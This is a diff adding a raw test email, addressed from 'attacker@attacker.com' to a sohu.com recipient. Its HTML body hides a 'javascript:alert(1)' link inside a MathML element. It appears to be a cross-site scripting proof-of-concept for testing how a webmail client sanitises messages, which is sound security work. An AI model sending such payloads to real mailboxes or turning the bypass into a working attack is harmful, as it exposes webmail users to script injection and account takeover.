@@ -1,0 +1,7 @@
+From: <attacker@attacker.com>
+Subject: test
+To: victim@sohu.com
+MIME-Version: 1.0
+Content-type: text/html
+
+<math><a xmlns:xlink="http://www.w3.org/1999/xlink" xlink:href="javascript:alert(1)" target="_blank">abc q<rect></rect></a> </math>i am
